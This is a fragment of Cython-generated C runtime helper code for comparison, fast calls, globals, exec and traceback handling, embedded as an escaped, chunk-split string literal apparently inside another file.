0x030B0000)\\\\n   \\\"\\\"         Py_hash_t hash1, hash2;\\\\n            hash1 = ((PyBytesObject*)s1)->ob_shash;\\\\n            hash2 = ((PyBytesObject*)s2)->ob_shash;\\\\n            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {\\\\n                return (equals == Py_NE);\\\\n            }\\\\n#endif\\\\n            result = memcmp(ps1, ps2, (size_t)length);\\\\n            return (equals == Py_EQ) ? (result == 0) : (result != 0);\\\\n        }\\\\n    } else if ((s1 == Py_None) & PyBytes_CheckExact(s2)) {\\\\n        return (equals == Py_NE);\\\\n    } else if ((s2 == Py_None) & PyBytes_CheckExact(s1)) {\\\\n        return (equals == Py_NE);\\\\n    } else {\\\\n        int result;\\\\n        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);\\\\n        if (!py_result)\\\\n            return -1;\\\\n        result = __Pyx_PyObject_IsTrue(py_result);\\\\n        Py_DECREF(py_result);\\\\n        return result;\\\\n    }\\\\n#endif\\\\n}\\\\n\\\\n/* UnicodeEquals */\\\\nstatic CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals) {\\\\n#if CYTHON_COMPILING_IN_PYPY\\\\n    return PyObject_RichCompareBool(s1, s2, equals);\\\\n#else\\\\n#if PY_MAJOR_VERSION < 3\\\\n    PyObject* owned_ref = NULL;\\\\n#endif\\\\n    int s1_is_unicode, s2_is_unicode;\\\\n    if (s1 == s2) {\\\\n        goto return_eq;\\\\n    }\\\\n    s1_is_unicode = PyUnicode_CheckExact(s1);\\\\n    s2_is_unicode = PyUnicode_CheckExact(s2);\\\\n#if PY_MAJOR_VERSION < 3\\\\n    if (""(s1_is_unicode & (!s2_is_unicode)) && PyString_CheckExact(s2)) {\\\\n        owned_ref = PyUnicode_FromObject(s2);\\\\n        if (unlikely(!owned_ref))\\\\n            return -1;\\\\n        s2 = owned_ref;\\\\n        s2_is_unicode = 1;\\\\n    } else if ((s2_is_unicode & (!s1_is_unicode)) && PyString_CheckExact(s1)) {\\\\n        owned_ref = PyUnicode_FromObject(s1);\\\\n        if (unlikely(!owned_ref))\\\\n            return -1;\\\\n        s1 = owned_ref;\\\\n        s1_is_unico\"\"de = 1;\\\\n    } else if (((!s2_is_unicode) & (!s1_is_unicode))) {\\\\n        return __Pyx_PyBytes_Equals(s1, s2, equals);\\\\n    }\\\\n#endif\\\\n    if (s1_is_unicode & s2_is_unicode) {\\\"\\\"\\\\n        Py_ssize_t length;\\\\n        int kind;\\\\n        void *data1, *data2;\\\\n        if (unlikely(__Pyx_PyUnicode_READY(s1) < 0) || unlikely(__Pyx_PyUnicode_READY(s2) < 0))\\\\n            return -1;\\\\n        length = __Pyx_PyUnicode_GET_LENGTH(s1);\\\\n        if (length != __Pyx_PyUnicode_GET_LENGTH(s2)) {\\\\n            goto return_ne;\\\\n        }\\\\n#if CYTHON_USE_UNICODE_INTERNALS\\\\n        {\\\\n            Py_hash_t hash1, hash2;\\\\n        #if CYTHON_PEP393_ENABLED\\\\n            hash1 = ((PyASCIIObject*)s1)->hash;\\\\n            hash2 = ((PyASCIIObject*)s2)->hash;\\\\n        #else\\\\n            hash1 = ((PyUnicodeObject*)s1)->hash;\\\\n            hash2 = ((PyUnicodeObject*)s2)->hash;\\\\n        #endif\\\\n            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {\\\\n                goto return_ne;\\\\n            }\\\\n        }\\\\n#endif\\\\n        kind = __Pyx_PyUnicode_KIND(s1);\\\\n        if (kind != __Pyx_PyUnicode_KIND(s2)) {\\\\n            goto return_ne;\\\\n        }\\\\n        data1 = __Pyx_PyUnicode_DATA(s1);\\\\n        data2 = __Pyx_PyUnicode_DATA(s2);\\\\n        if (__Pyx_PyUnicode_READ(kind, data1, 0) != __Pyx_PyUnicode_READ(kind, data2, 0)) {\\\\n            goto return_ne;\\\\n        } else if (length == 1) {\\\\n      ""      goto return_eq;\\\\n        } else {\\\\n            int result = memcmp(data1, data2, (size_t)(length * kind));\\\\n            #if PY_MAJOR_VERSION < 3\\\\n            Py_XDECREF(owned_ref);\\\\n            #endif\\\\n            return (equals == Py_EQ) ? (result == 0) : (result != 0);\\\\n        }\\\\n    } else if ((s1 == Py_None) & s2_is_unicode) {\\\\n        goto return_ne;\\\\n    } else if ((s2 == Py_None) & s1_is_unicode) {\\\\n        goto return_ne;\\\\n    } else {\\\\n        int result;\\\\n        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);\\\\n        #if PY\"\"_MAJOR_VERSION < 3\\\\n        Py_XDECREF(owned_ref);\\\\n        #endif\\\\n        if (!py_result)\\\\n            return -1;\\\\n        result = __Pyx_PyObject_IsTrue(py_result);\\\\n        Py_DECREF(py_result);\\\\n        return result;\\\\n    }\\\"\\\"\\\\nreturn_eq:\\\\n    #if PY_MAJOR_VERSION < 3\\\\n    Py_XDECREF(owned_ref);\\\\n    #endif\\\\n    return (equals == Py_EQ);\\\\nreturn_ne:\\\\n    #if PY_MAJOR_VERSION < 3\\\\n    Py_XDECREF(owned_ref);\\\\n    #endif\\\\n    return (equals == Py_NE);\\\\n#endif\\\\n}\\\\n\\\\n/* PyCFunctionFastCall */\\\\n#if CYTHON_FAST_PYCCALL\\\\nstatic CYTHON_INLINE PyObject * __Pyx_PyCFunction_FastCall(PyObject *func_obj, PyObject **args, Py_ssize_t nargs) {\\\\n    PyCFunctionObject *func = (PyCFunctionObject*)func_obj;\\\\n    PyCFunction meth = PyCFunction_GET_FUNCTION(func);\\\\n    PyObject *self = PyCFunction_GET_SELF(func);\\\\n    int flags = PyCFunction_GET_FLAGS(func);\\\\n    assert(PyCFunction_Check(func));\\\\n    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));\\\\n    assert(nargs >= 0);\\\\n    assert(nargs == 0 || args != NULL);\\\\n    /* _PyCFunction_FastCallDict() must not be called with an exception set,\\\\n       because it may clear it (directly or indirectly) and so the\\\\n       caller loses its exception */\\\\n    assert(!PyErr_""Occurred());\\\\n    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {\\\\n        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);\\\\n    } else {\\\\n        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);\\\\n    }\\\\n}\\\\n#endif\\\\n\\\\n/* PyFunctionFastCall */\\\\n#if CYTHON_FAST_PYCALL\\\\nstatic PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,\\\\n                                               PyObject *globals) {\\\\n    PyFrameObject *f;\\\\n    PyThreadState *tstate = __Pyx_PyThreadState_Current;\\\\n    PyObject **fastlocals;\\\\n    Py_ssize_t i;\\\\n    PyObject *result;\"\"\\\\n    assert(globals != NULL);\\\\n    /* XXX Perhaps we should create a specialized\\\\n       PyFrame_New() that doesn't take locals, but does\\\\n       take builtins without sanity checking them.\\\\n       */\\\\n    assert(tstate != NULL);\\\\n    f = PyFrame_New(tstate, co, globals, NULL);\\\\n    if (f \\\"\\\"== NULL) {\\\\n        return NULL;\\\\n    }\\\\n    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);\\\\n    for (i = 0; i < na; i++) {\\\\n        Py_INCREF(*args);\\\\n        fastlocals[i] = *args++;\\\\n    }\\\\n    result = PyEval_EvalFrameEx(f,0);\\\\n    ++tstate->recursion_depth;\\\\n    Py_DECREF(f);\\\\n    --tstate->recursion_depth;\\\\n    return result;\\\\n}\\\\n#if 1 || PY_VERSION_HEX < 0x030600B1\\\\nstatic PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {\\\\n    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);\\\\n    PyObject *globals = PyFunction_GET_GLOBALS(func);\\\\n    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);\\\\n    PyObject *closure;\\\\n#if PY_MAJOR_VERSION >= 3\\\\n    PyObject *kwdefs;\\\\n#endif\\\\n    PyObject *kwtuple, **k;\\\\n    PyObject **d;\\\\n    Py_ssize_t nd;\\\\n    Py_ssize_t nk;\\\\n    PyObject *result;\\\\n    assert(""kwargs == NULL || PyDict_Check(kwargs));\\\\n    nk = kwargs ? PyDict_Size(kwargs) : 0;\\\\n    if (Py_EnterRecursiveCall((char*)\\\\\\\" while calling a Python object\\\\\\\")) {\\\\n        return NULL;\\\\n    }\\\\n    if (\\\\n#if PY_MAJOR_VERSION >= 3\\\\n            co->co_kwonlyargcount == 0 &&\\\\n#endif\\\\n            likely(kwargs == NULL || nk == 0) &&\\\\n            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {\\\\n        if (argdefs == NULL && co->co_argcount == nargs) {\\\\n            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);\\\\n            goto done;\\\\n        }\\\\n        else if (nargs == 0 && argdefs != NULL\\\\n                 && co->co_argcount == Py_SIZE(argdefs)) {\\\\n            /* function called with no arguments, but all parameters have\\\\n           \"\"    a default value: use default values as arguments .*/\\\\n            args = &PyTuple_GET_ITEM(argdefs, 0);\\\\n            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);\\\\n            goto done;\\\\n        }\\\\n    }\\\\n    if (kwargs != NULL) {\\\\n        Py_ssize_t pos, i;\\\\n        kwtuple = PyTuple_New(2 * nk);\\\\n        if (kwtupl\\\"\\\"e == NULL) {\\\\n            result = NULL;\\\\n            goto done;\\\\n        }\\\\n        k = &PyTuple_GET_ITEM(kwtuple, 0);\\\\n        pos = i = 0;\\\\n        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {\\\\n            Py_INCREF(k[i]);\\\\n            Py_INCREF(k[i+1]);\\\\n            i += 2;\\\\n        }\\\\n        nk = i / 2;\\\\n    }\\\\n    else {\\\\n        kwtuple = NULL;\\\\n        k = NULL;\\\\n    }\\\\n    closure = PyFunction_GET_CLOSURE(func);\\\\n#if PY_MAJOR_VERSION >= 3\\\\n    kwdefs = PyFunction_GET_KW_DEFAULTS(func);\\\\n#endif\\\\n    if (argdefs != NULL) {\\\\n        d = &PyTuple_GET_ITEM(argdefs, 0);\\\\n        nd = Py_SIZE(argdefs);\\\\n    }\\\\n    else {\\\\n        d = NULL;\\\\n        nd = 0;\\\\n    }""\\\\n#if PY_MAJOR_VERSION >= 3\\\\n    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,\\\\n                               args, (int)nargs,\\\\n                               k, (int)nk,\\\\n                               d, (int)nd, kwdefs, closure);\\\\n#else\\\\n    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,\\\\n                               args, (int)nargs,\\\\n                               k, (int)nk,\\\\n                               d, (int)nd, closure);\\\\n#endif\\\\n    Py_XDECREF(kwtuple);\\\\ndone:\\\\n    Py_LeaveRecursiveCall();\\\\n    return result;\\\\n}\\\\n#endif\\\\n#endif\\\\n\\\\n/* PyObjectCallMethO */\\\\n#if CYTHON_COMPILING_IN_CPYTHON\\\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {\\\\n    PyObject *self, *result;\\\\n    PyCFunction cfunc;\\\\n    cfunc = PyCFunction_GET_FUNCTION(func);\\\\n    self = PyCFunction_GET_SELF(func);\\\\n    if (unlikely(Py_En\"\"terRecursiveCall((char*)\\\\\\\" while calling a Python object\\\\\\\")))\\\\n        return NULL;\\\\n    result = cfunc(self, arg);\\\\n    Py_LeaveRecursiveCall();\\\\n    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {\\\\n        PyErr_SetString(\\\\n            PyExc_SystemError,\\\\n            \\\\\\\"NULL result without error in PyObject_Call\\\\\\\");\\\\n    }\\\\n    return result;\\\\n}\\\\n#endif\\\\n\\\\n/* PyObjectCallOneArg */\\\\n#if CYTHON_COMPILING_IN_CPY\\\"\\\"THON\\\\nstatic PyObject* __Pyx__PyObject_CallOneArg(PyObject *func, PyObject *arg) {\\\\n    PyObject *result;\\\\n    PyObject *args = PyTuple_New(1);\\\\n    if (unlikely(!args)) return NULL;\\\\n    Py_INCREF(arg);\\\\n    PyTuple_SET_ITEM(args, 0, arg);\\\\n    result = __Pyx_PyObject_Call(func, args, NULL);\\\\n    Py_DECREF(args);\\\\n    return result;\\\\n}\\\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {\\\\n#if CYTHON_FAST_PYCALL\\\\n    if (PyFunction_Check(fun""c)) {\\\\n        return __Pyx_PyFunction_FastCall(func, &arg, 1);\\\\n    }\\\\n#endif\\\\n    if (likely(PyCFunction_Check(func))) {\\\\n        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {\\\\n            return __Pyx_PyObject_CallMethO(func, arg);\\\\n#if CYTHON_FAST_PYCCALL\\\\n        } else if (__Pyx_PyFastCFunction_Check(func)) {\\\\n            return __Pyx_PyCFunction_FastCall(func, &arg, 1);\\\\n#endif\\\\n        }\\\\n    }\\\\n    return __Pyx__PyObject_CallOneArg(func, arg);\\\\n}\\\\n#else\\\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {\\\\n    PyObject *result;\\\\n    PyObject *args = PyTuple_Pack(1, arg);\\\\n    if (unlikely(!args)) return NULL;\\\\n    result = __Pyx_PyObject_Call(func, args, NULL);\\\\n    Py_DECREF(args);\\\\n    return result;\\\\n}\\\\n#endif\\\\n\\\\n/* GetAttr */\\\\nstatic CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *o, PyObject *n) {\\\\n#if CYTHON_USE_TYPE_SLOTS\\\\n#if PY_MAJOR_VERSION >= 3\\\\n    if (likely(PyUnicode_Check(n)))\\\\n#else\\\\n    if (likely(PyString_Check(n)))\\\\n#endif\\\\n        retur\"\"n __Pyx_PyObject_GetAttrStr(o, n);\\\\n#endif\\\\n    return PyObject_GetAttr(o, n);\\\\n}\\\\n\\\\n/* Globals */\\\\nstatic PyObject* __Pyx_Globals(void) {\\\\n    Py_ssize_t i;\\\\n    PyObject *names;\\\\n    PyObject *globals = __pyx_d;\\\\n    Py_INCREF(globals);\\\\n    names = PyObject_Dir(__pyx_m);\\\\n    if (!names)\\\\n        goto bad;\\\\n    for (i = PyList_GET_SIZE(names)-1; i >= 0; i--) {\\\\n#if CYTHON_COMPILING_IN_PYPY\\\\n        PyObject* name = PySequence_ITEM(names, i);\\\\n        if (!name)\\\\n            goto bad;\\\"\\\"\\\\n#else\\\\n        PyObject* name = PyList_GET_ITEM(names, i);\\\\n#endif\\\\n        if (!PyDict_Contains(globals, name)) {\\\\n            PyObject* value = __Pyx_GetAttr(__pyx_m, name);\\\\n            if (!value) {\\\\n#if CYTHON_COMPILING_IN_PYPY\\\\n                Py_DECREF(name);\\\\n#endif\\\\n          ""      goto bad;\\\\n            }\\\\n            if (PyDict_SetItem(globals, name, value) < 0) {\\\\n#if CYTHON_COMPILING_IN_PYPY\\\\n                Py_DECREF(name);\\\\n#endif\\\\n                Py_DECREF(value);\\\\n                goto bad;\\\\n            }\\\\n        }\\\\n#if CYTHON_COMPILING_IN_PYPY\\\\n        Py_DECREF(name);\\\\n#endif\\\\n    }\\\\n    Py_DECREF(names);\\\\n    return globals;\\\\nbad:\\\\n    Py_XDECREF(names);\\\\n    Py_XDECREF(globals);\\\\n    return NULL;\\\\n}\\\\n\\\\n/* PyExec */\\\\nstatic CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject* o, PyObject* globals) {\\\\n    return __Pyx_PyExec3(o, globals, NULL);\\\\n}\\\\nstatic PyObject* __Pyx_PyExec3(PyObject* o, PyObject* globals, PyObject* locals) {\\\\n    PyObject* result;\\\\n    PyObject* s = 0;\\\\n    char *code = 0;\\\\n    if (!globals || globals == Py_None) {\\\\n        globals = __pyx_d;\\\\n    } else if (!PyDict_Check(globals)) {\\\\n        PyErr_Format(PyExc_TypeError, \\\\\\\"exec() arg 2 must be a dict, not %.200s\\\\\\\",\\\\n                     Py_TYPE(globals)->tp_name);\\\\n        goto bad;\\\\n    }\\\\n    if (!locals || locals == Py_None) {\\\\n        locals = globals;\\\\n    }\\\\n    if (__Pyx_PyDict_GetItemStr(globals, __pyx_n_s_builtin\"\"s) == NULL) {\\\\n        if (PyDict_SetItem(globals, __pyx_n_s_builtins, PyEval_GetBuiltins()) < 0)\\\\n            goto bad;\\\\n    }\\\\n    if (PyCode_Check(o)) {\\\\n        if (__Pyx_PyCode_HasFreeVars((PyCodeObject *)o)) {\\\\n            PyErr_SetString(PyExc_TypeError,\\\\n                \\\\\\\"code object passed to exec() may not contain free variables\\\\\\\");\\\\n            goto bad;\\\\n        }\\\\n        #if PY_VERSION_HEX < 0x030200B1 || (CYTHON_COMPILING_IN_PYPY && PYPY_VERSION_NUM < 0x07030400)\\\\n        result = PyEval_EvalCode((PyCodeObject *)o, globals, locals);\\\\n        #els\\\"\\\"e\\\\n        result = PyEval_EvalCode(o, globals, locals);\\\\n        #endif\\\\n    } else {""\\\\n        PyCompilerFlags cf;\\\\n        cf.cf_flags = 0;\\\\n#if PY_VERSION_HEX >= 0x030800A3\\\\n        cf.cf_feature_version = PY_MINOR_VERSION;\\\\n#endif\\\\n        if (PyUnicode_Check(o)) {\\\\n            cf.cf_flags = PyCF_SOURCE_IS_UTF8;\\\\n            s = PyUnicode_AsUTF8String(o);\\\\n            if (!s) goto bad;\\\\n            o = s;\\\\n        #if PY_MAJOR_VERSION >= 3\\\\n        } else if (!PyBytes_Check(o)) {\\\\n        #else\\\\n        } else if (!PyString_Check(o)) {\\\\n        #endif\\\\n            PyErr_Format(PyExc_TypeError,\\\\n                \\\\\\\"exec: arg 1 must be string, bytes or code object, got %.200s\\\\\\\",\\\\n                Py_TYPE(o)->tp_name);\\\\n            goto bad;\\\\n        }\\\\n        #if PY_MAJOR_VERSION >= 3\\\\n        code = PyBytes_AS_STRING(o);\\\\n        #else\\\\n        code = PyString_AS_STRING(o);\\\\n        #endif\\\\n        if (PyEval_MergeCompilerFlags(&cf)) {\\\\n            result = PyRun_StringFlags(code, Py_file_input, globals, locals, &cf);\\\\n        } else {\\\\n            result = PyRun_String(code, Py_file_input, globals, locals);\\\\n        }\\\\n        Py_XDECREF(s);\\\\n    }\\\\n    return result;\\\\nbad:\\\\n    Py_XDECREF(s);\\\\n    return 0;\\\\n}\\\\n\\\\n/* PyExecGlobals */\\\\nstatic PyObject* __Pyx_PyExecGlobals(PyObject* code) {\\\\n    PyObject* result;\\\\n    PyObject* globals = __Py\"\"x_Globals();\\\\n    if (unlikely(!globals))\\\\n        return NULL;\\\\n    result = __Pyx_PyExec2(code, globals);\\\\n    Py_DECREF(globals);\\\\n    return result;\\\\n}\\\\n\\\\n/* PyErrFetchRestore */\\\\n#if CYTHON_FAST_THREAD_STATE\\\\nstatic CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {\\\\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\\\\n    tmp_type = tstate->curexc_type;\\\\n    tmp_value = tstate->curexc_value;\\\\n    tmp_tb = tstate->curexc_traceback;\\\\n    tstate->curexc_type = type;""\\\\n    tstate->curexc_value = value;\\\\n    tstate->curexc_traceback = tb;\\\\n    Py_XDECREF(tmp_type);\\\\n    Py\\\"\\\"_XDECREF(tmp_value);\\\\n    Py_XDECREF(tmp_tb);\\\\n}\\\\nstatic CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {\\\\n    *type = tstate->curexc_type;\\\\n    *value = tstate->curexc_value;\\\\n    *tb = tstate->curexc_traceback;\\\\n    tstate->curexc_type = 0;\\\\n    tstate->curexc_value = 0;\\\\n    tstate->curexc_traceback = 0;\\\\n}\\\\n#endif\\\\n\\\\n/* CLineInTraceback */\\\\n#ifndef CYTHON_CLINE_IN_TRACEBACK\\\\nstatic int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {\\\\n    PyObject *use_cline;\\\\n    PyObject *ptype, *pvalue, *ptraceback;\\\\n#if CYTHON_COMPILING_IN_CPYTHON\\\\n    PyObject **cython_runtime_dict;\\\\n#endif\\\\n    if (unlikely(!__pyx_cython_runtime)) {\\\\n        return c_line;\\\\n    }\\\\n    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);\\\\n#if CYTHON_COMPILING_IN_CPYTHON\\\\n    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);\\\\n    if (likely(cython_runtime_dict)) {\\\\n        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(\\\\n            use_cline, *cython_runtime_dict,\\\\n            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))\\\\n    } else\\\\n#endif\\\\n    {\\\\n      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);\\\\n      if (use_cline\"\"_obj) {\\\\n        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;\\\\n        Py_DECREF(use_cline_obj);\\\\n      } else {\\\\n        PyErr_Clear();\\\\n        use_cline = NULL;\\\\n      }\\\\n    }\\\\n    if (!use_cline) {\\\\n        c_line = 0;\\\\n        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);\\\\n    }\\\\n    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(us""e_cline) != 0)) {\\\\n        c_line = 0;\\\\n    }\\\\n    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);\\\\n    return c_line;\\\\n}\\\\n#endif\\\\n\\\\n/* CodeObjectCache */\\\\nstatic int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {\\\"\\\"\\\\n    int start = 0, mid = 0, end = count - 1;\\\\n    if (end >= 0 && code_line > entries[end].code_line) {\\\\n        return count;\\\\n    }\\\\n    while (start < end) {\\\\n        mid = start + (end - start) / 2;\\\\n        if (code_line < entries[mid].code_line) {\\\\n            end = mid;\\\\n        } else if (code_line > entries[mid].code_line) {\\\\n             start = mid + 1;\\\\n        } else {\\\\n            return mid;\\\\n        }\\\\n    }\\\\n    if (code_line <= entries[mid].code_line) {\\\\n        return mid;\\\\n    } else {\\\\n        return mid + 1;\\\\n    }\\\\n}\\\\nstatic PyCodeObject *__pyx_find_code_object(int code_line) {\\\\n    PyCodeObject* code_object;\\\\n    int pos;\\\\n    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {\\\\n        return NULL;\\\\n    }\\\\n    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);\\\\n    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {\\\\n        return NULL;\\\\n    }\\\\n    code_object = __pyx_code_cache.entries[pos].code_object;\\\\n    Py_INCREF(code_object);\\\\n    return code_object;\\\\n}\\\\nstatic void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {\\\\n    int pos, i;\\\\n    __Pyx_CodeObjectCach\"\"eEntry* entries = __pyx_code_cache.entries;\\\\n    if (unlikely(!code_line)) {\\\\n        return;\\\\n    }\\\\n    if (unlikely(!entries)) {\\\\n        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));\\\\n        if (likely(entries)) {\\\\n            __pyx_code_cache.entries = entries;""\\\\n            __pyx_code_cache.max_count = 64;\\\\n            __pyx_code_cache.count = 1;\\\\n            entries[0].code_line = code_line;\\\\n            entries[0].code_object = code_object;\\\\n            Py_INCREF(code_object);\\\\n        }\\\\n        return;\\\\n    }\\\\n    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);\\\\n    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].co\\\"\\\"de_line == code_line)) {\\\\n        PyCodeObject* tmp = entries[pos].code_object;\\\\n        entries[pos].code_object = code_object;\\\\n        Py_DECREF(tmp);\\\\n        return;\\\\n    }\\\\n    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {\\\\n        int new_max = __pyx_code_cache.max_count + 64;\\\\n        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(\\\\n            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));\\\\n        if (unlikely(!entries)) {\\\\n            return;\\\\n        }\\\\n        __pyx_code_cache.entries = entries;\\\\n        __pyx_code_cache.max_count = new_max;\\\\n    }\\\\n    for (i=__pyx_code_cache.count; i>pos; i--) {\\\\n        entries[i] = entries[i-1];\\\\n    }\\\\n    entries[pos].code_line = code_line;\\\\n    entries[pos].code_object = code_object;\\\\n    __pyx_code_cache.count++;\\\\n    Py_INCREF(code_object);\\\\n}\\\\n\\\\n/* AddTraceback */\\\\n#include \\\\\\\"compile.h\\\\\\\"\\\\n#include \\\\\\\"frameobject.h\\\\\\\"\\\\n#include \\\\\\\"traceback.h\\\\\\\"\\\\n#if PY_VERSION_HEX >= 0x030b00a6\\\\n  #ifndef Py_BUILD_CORE\\\\n    #define Py_BUILD_CORE 1\\\\n  #endif\\\\n  #include \\\\\\\"internal/pycore_frame.h\\\\\\\"\\\\n#endif\\\\nstatic PyCodeObject* __Pyx_CreateCodeObjectForTraceback(\"\"\\\\n            const char *funcname, int c_line,\\\\n            int py_line, const char *filename) {\\\\n    PyCodeObject *py_code = NULL;\\\\n    PyObject *py_funcname = NULL;\\\\n    #if PY_""MAJOR_VERSION < 3\\\\n    PyObject *py_srcfile = NULL;\\\\n    py_srcfile = PyString_FromString(filename);\\\\n    if (!py_srcfile) goto bad;\\\\n    #endif\\\\n    if (c_line) {\\\\n        #if PY_MAJOR_VERSION < 3\\\\n        py_funcname = PyString_FromFormat( \\\\\\\"%s (%s:%d)\\\\\\\", funcname, __pyx_cfilenm, c_line);\\\\n        if (!py_funcname) goto bad;\\\\n        #else\\\\n        py_funcname = PyUnicode_FromFormat( \\\\\\\"%s (%s:%d)\\\\\\\", funcname, __pyx_cfilenm, c_line);\\\\n        if (!py_funcname) goto bad;\\\\n        funcname = PyUnicode_AsUTF8(py_funcname);\\\\n        if (!funcname) goto bad;\\\\n        #endif\\\\n    }\\\\n    else {\\\\n        #if PY_MAJOR_VERSION < 3\\\\n        py_funcname \\\"\\\"= PyString_FromString(funcname);\\\\n        if (!py_funcname) goto bad;\\\\n        #endif\\\\n    }\\\\n    #if PY_MAJOR_VERSION < 3\\\\n    py_code = __Pyx_PyCode_New(\\\\n        0,\\\\n        0,\\\\n        0,\\\\n        0,\\\\n        0,\\\\n        __pyx_empty_bytes, /*PyObject *code,*/\\\\n        __pyx_empty_tuple, /*PyObject *consts,*/\\\\n        __pyx_empty_tuple, /*PyObject *names,*/\\\\n        __pyx_empty_tuple, /*PyObject *varnames,*/\\\\n        __pyx_empty_tuple, /*PyObject *freevars,*/\\\\n        __pyx_empty_tuple, /*PyObject *cellvars,*/\\\\n        py_srcfile,   /*PyObject *filename,*/\\\\n        py_funcname,  /*PyObject *name,*/\\\\n        py_line,\\\\n        __pyx_empty_bytes  /*PyObject *lnotab*/\\\\n    );\\\\n    Py_DECREF(py_srcfile);\\\\n    #else\\\\n    py_code = PyCode_NewEmpty(filename, funcname, py_line);\\\\n    #endif\\\\n    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline\\\\n    return py_code;\\\\nbad:\\\\n    Py_XDECREF(py_funcname);\\\\n    #if PY_MAJOR_VERSION < 3\\\\n    Py_XDECREF(py_srcfile);\\\\n    #endif\\\\n    return NULL;\\\\n}\\\\nstatic void __Pyx_AddTraceback(const char *funcname, int c_line,\\\\n        \"\"                       int py_line, const char *filen""ame) {\\\\n    PyCodeObject *py_code = 0;\\\\n    PyFrameObject *py_frame = 0;\\\\n    PyThreadState *tstate = __Pyx_PyThreadState_Current;\\\\n    PyObject *ptype, *pvalue, *ptraceback;\\\\n    if (c_line) {\\\\n        c_line = __Pyx_CLineForTraceback(tstate, c_line);\\\\n    }\\\\n    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);\\\\n    if (!py_code) {\\\\n        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);\\\\n        py_code = __Pyx_CreateCodeObjectForTraceback(\\\\n            funcname, c_line, py_line, filename);\\\\n        if (!py_code) {\\\\n            /* If the code object creation fails, then we should clear the\\\\n               fetched exception references and propagate the new exception */\\\\n            Py_XDECREF(ptype);\\\\n            Py_XDECREF(pvalue);\\\\n            Py_XDECREF(ptraceback);\\\\n            goto bad;\\\\n        }\\\\n       \\\"\\\" __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);\\\\n        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);\\\\n    }\\\\n    py_frame = PyFrame_New(\\\\n        tstate,            /*PyThreadState *tstate,*/\\\\n        py_code,           /*PyCodeObject *code,*/\\\\n        __pyx_d,    /*PyObject *globals,*/\\\\n        0                  /*PyObject *locals*/\\\\n    );\\\\n    if (!py_frame) goto bad;\\\\n    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);\\\\n    PyTraceBack_Here(py_frame);\\\\nbad:\\\\n    Py_XDECREF(py_code);\\\\n    Py_XDECREF(py_frame);\\\\n}\\\\n\\\\n/* MainFunction */\\\\n#ifdef __FreeBSD__\\\\n#include 